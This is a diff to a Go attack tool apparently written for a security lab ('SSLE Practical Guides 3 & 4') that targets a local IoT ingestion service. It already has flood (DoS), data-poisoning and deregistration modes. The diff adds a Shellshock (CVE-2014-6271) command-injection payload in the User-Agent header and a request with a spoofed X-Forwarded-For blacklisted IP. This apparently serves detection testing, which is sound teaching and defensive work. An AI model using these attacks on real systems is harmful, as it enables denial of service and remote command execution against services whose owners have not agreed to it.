@@ -20,7 +20,7 @@ import (
 type Config struct {
 	TargetURL    string
 	RegistryURL  string
-	Mode         string // "dos", "flood", "poison", "deregister", "all"
+	Mode         string // "flood", "poison", "deregister", "shellshock", "malicious_ip", "all"
 	Concurrency  int
 	RateLimitMs  int
 	DeviceID     string
@@ -44,7 +44,7 @@ func main() {
 	var cfg Config
 	flag.StringVar(&cfg.TargetURL, "target", getEnv("TARGET_URL", "http://localhost:5001"), "Target ingestion/service base URL")
 	flag.StringVar(&cfg.RegistryURL, "registry", getEnv("REGISTRY_URL", "http://localhost:5050"), "Target registry base URL")
-	flag.StringVar(&cfg.Mode, "mode", getEnv("ATTACK_MODE", "flood"), "Attack mode: flood (DoS), poison, deregister, or all")
+	flag.StringVar(&cfg.Mode, "mode", getEnv("ATTACK_MODE", "flood"), "Attack mode: flood, poison, deregister, shellshock, malicious_ip, or all")
 	flag.IntVar(&cfg.Concurrency, "concurrency", 5, "Number of concurrent attacking threads")
 	flag.IntVar(&cfg.RateLimitMs, "delay", 10, "Delay between requests per thread in ms (0 for max flood)")
 	flag.StringVar(&cfg.DeviceID, "device-id", getEnv("ATTACKER_DEVICE_ID", "attacker-bot-01"), "Attacker spoofed device ID")
@@ -52,7 +52,7 @@ func main() {
 	flag.Parse()
 
 	log.Printf("======================================================")
-	log.Printf("  SSLE Practical Guide 3 - Adversary / Attacker Service")
+	log.Printf("  SSLE Practical Guides 3 & 4 - Adversary Tool")
 	log.Printf("======================================================")
 	log.Printf("  Target URL:    %s", cfg.TargetURL)
 	log.Printf("  Registry URL:  %s", cfg.RegistryURL)
@@ -112,7 +112,7 @@ func runWorker(workerID int, cfg Config, stopCh chan struct{}) {
 		mode := cfg.Mode
 		if mode == "all" {
 			// Randomly select one mode per iteration
-			modes := []string{"flood", "poison", "deregister"}
+			modes := []string{"flood", "poison", "deregister", "shellshock", "malicious_ip"}
 			mode = modes[rand.Intn(len(modes))]
 		}
 
@@ -121,6 +121,10 @@ func runWorker(workerID int, cfg Config, stopCh chan struct{}) {
 			attackPoison(cfg)
 		case "deregister":
 			attackDeregister(cfg)
+		case "shellshock":
+			attackShellshock(cfg)
+		case "malicious_ip":
+			attackMaliciousIP(cfg)
 		case "flood", "dos":
 			attackFlood(cfg)
 		default:
@@ -223,5 +227,72 @@ func attackDeregister(cfg Config) {
 		if delResp.StatusCode >= 400 {
 			totalErrors.Add(1)
 		}
+	}
+}
+
+// attackShellshock: Practical Guide 4 - Injects CVE-2014-6271 exploit payload via HTTP User-Agent header
+func attackShellshock(cfg Config) {
+	endpoint := strings.TrimSuffix(cfg.TargetURL, "/") + "/ingest"
+	payload := map[string]any{
+		"device_id":   "exploiter-node",
+		"temperature": 22.0,
+	}
+	body, _ := json.Marshal(payload)
+
+	req, err := http.NewRequest(http.MethodPost, endpoint, bytes.NewBuffer(body))
+	if err != nil {
+		totalErrors.Add(1)
+		return
+	}
+
+	// Standard Shellshock signature tested in Guide 4: () { :; }; <command>
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", "() { :; }; /bin/bash -c 'echo VULNERABLE_CVE_2014_6271 > /tmp/shellshock_alert'")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		totalErrors.Add(1)
+		return
+	}
+	defer resp.Body.Close()
+	io.Copy(io.Discard, resp.Body)
+
+	totalRequests.Add(1)
+	if resp.StatusCode >= 400 {
+		totalErrors.Add(1)
+	}
+}
+
+// attackMaliciousIP: Sends request simulating an IP listed in the AlienVault IP reputation CDB list
+func attackMaliciousIP(cfg Config) {
+	endpoint := strings.TrimSuffix(cfg.TargetURL, "/") + "/ingest"
+	payload := map[string]any{
+		"device_id":   "reputation-bot",
+		"temperature": 21.5,
+	}
+	body, _ := json.Marshal(payload)
+
+	req, err := http.NewRequest(http.MethodPost, endpoint, bytes.NewBuffer(body))
+	if err != nil {
+		totalErrors.Add(1)
+		return
+	}
+
+	// Known blacklisted IP in AlienVault reputation list
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("X-Forwarded-For", "198.51.100.25")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ThreatBot/1.0")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		totalErrors.Add(1)
+		return
+	}
+	defer resp.Body.Close()
+	io.Copy(io.Discard, resp.Body)
+
+	totalRequests.Add(1)
+	if resp.StatusCode >= 400 {
+		totalErrors.Add(1)
 	}
 }
